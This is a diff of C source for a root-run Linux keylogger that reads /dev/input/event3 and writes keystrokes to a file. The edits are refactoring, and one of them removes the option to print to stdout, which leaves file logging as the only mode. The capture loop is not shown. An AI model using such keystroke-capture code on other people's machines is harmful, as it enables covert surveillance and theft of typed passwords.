@@ -11,9 +11,9 @@
 
 #define KEYBOARD "/dev/input/event3"
 
-int running = 1;
+static int running = 1;
 
-static void catch(int signo)
+static void sig_handler(int signo)
 {
     running = 0;
 }
@@ -22,7 +22,7 @@ static void catch(int signo)
 /*
  * normal keyboard keystrokes 
  */
-const char * keycodes[] =
+static const char * keycodes[] =
 {
     "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
     "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
@@ -42,7 +42,7 @@ const char * keycodes[] =
 /*
  * keyboard keystrokes when the right or left Shift key is pressed
  */
-const char * shifted_keycodes[] =
+static const char * shifted_keycodes[] =
 {
     "RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", 
     "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", 
@@ -82,7 +82,7 @@ int isEsc(int code)
  */
 int isRoot(void) {
     if (geteuid() != 0) {
-        printf("\nMust run it as root, in order to have access "
+        fprintf(stderr, "\nMust run it as root, in order to have access "
                 "to the keyboard device\n");
         return 0;
     }
@@ -98,11 +98,10 @@ void usage(void)
     printf(
             "\n"
             "Usage:\n"
-            "     sudo ./keyloger [ -s | -f file] [-h]\n"
+            "     sudo ./keyloger -f file [-h]\n"
             "\n"
             "Options:\n"
             "  -f    file    Path to the output file.\n"
-            "  -s            Print to stdout.\n"
             "  -h            This help message.\n"
           );
     exit(EXIT_FAILURE);
@@ -118,7 +117,7 @@ void keylogger(int keyboard, char *output)
     if (output) {
         file = fopen(output, "w");
         if (!file) {
-            printf("Error opening file\n");
+            fprintf(stderr, "Error opening file\n");
             return;
         }
     }
@@ -175,27 +174,18 @@ void keylogger(int keyboard, char *output)
 int main(int argc, char *argv[])
 {
     int opt;
-    int root;
     int kb;
-    int to_stdout;
-    char *output;
+    char *output = NULL;
 
-    signal(SIGINT, catch);
+    signal(SIGINT, sig_handler);
 
-    output = NULL;
-    to_stdout = 0;
-
-    root = isRoot();
-    if (!root)
+    if (!isRoot())
         usage();
 
-    while ((opt = getopt(argc, argv, "f:sh")) != -1) {
+    while ((opt = getopt(argc, argv, "f:h")) != -1) {
         switch (opt) {
             case 'f':
                 output = strdup(optarg);
-                break;
-            case 's':
-                to_stdout = 1;
                 break;
             case 'h':
             default:
@@ -204,7 +194,7 @@ int main(int argc, char *argv[])
     }
 
     if ((kb = open(KEYBOARD, O_RDONLY)) < 0) {
-        printf("\nUnable to read from the device\n");
+        fprintf(stderr, "\nUnable to read from the device\n");
         exit(EXIT_FAILURE);
     }
 
